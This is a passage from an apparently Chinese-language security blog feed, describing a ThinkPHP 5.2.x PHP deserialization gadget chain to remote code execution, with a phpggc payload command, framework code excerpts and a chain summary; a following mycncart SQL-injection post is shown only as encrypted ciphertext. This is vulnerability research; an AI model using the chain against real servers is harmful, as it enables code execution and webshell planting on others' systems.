<code>$closure</code><br>phptp<code>SerializableClosure</code></li><li><code>vendor/opis/closure/src/SerializableClosure.php</code><br></li></ol><p>exp<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure><p>SerializableClosure</p><h2 id="think-Db-php-call"><a href="#think-Db-php-call" class="headerlink" title="think/Db.php __call"></a>think/Db.php __call</h2><p>5.1.37<code>__call</code>5.2.x<code>__destruct</code><code>__call</code><code>__call</code></p><p><code>vendor/topthink/framework/src/think/Db.php</code><code>__call</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $class = <span class="keyword">$this</span>-&gt;config[<span class="string">'query'</span>];</span><br><span class="line"></span><br><span class="line">    $query = <span class="keyword">new</span> $class(<span class="keyword">$this</span>-&gt;connection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_user_func_array([$query, $method], $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;config</code><code>$this-&gt;connection</code><code>think\Url</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(App $app, array $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app    = $app;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_file($app-&gt;getRuntimePath() . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $app-&gt;route-&gt;import(<span class="keyword">include</span> $app-&gt;getRuntimePath() . <span class="string">'route.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RuntimePathroute.phproute.phpwebshellRuntimePath<code>$app</code><code>$runtimePath</code></p><p>App</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $runtimePath;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $rootPath = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rootPath = $rootPath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;runtimePath = <span class="string">"/tmp/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = <span class="keyword">new</span> \think\route\RuleName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p></p><ol><li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br><code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> <code>filename</code><code>filename</code><br><code>__toString</code><code>__toString</code></li><li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br><code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>-&gt;<code>appendAttrToArray</code>-&gt;<code>$relation</code><code>__call</code></li><li><code>vendor/topthink/framework/src/think/Db.php</code><br><code>__call</code> -&gt; <code>new $class($this-&gt;connection)</code> <code>__construct</code></li><li><code>vendor/topthink/framework/src/think/Url.php</code><br>App<code>include</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewmycncart sqli</title>
      <link href="2019/02/25/php/mycncart-v2-0-0-3-sqli/"/>
      <url>2019/02/25/php/mycncart-v2-0-0-3-sqli/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="welcome to my blog, enter password to read." />    <label for="pass">welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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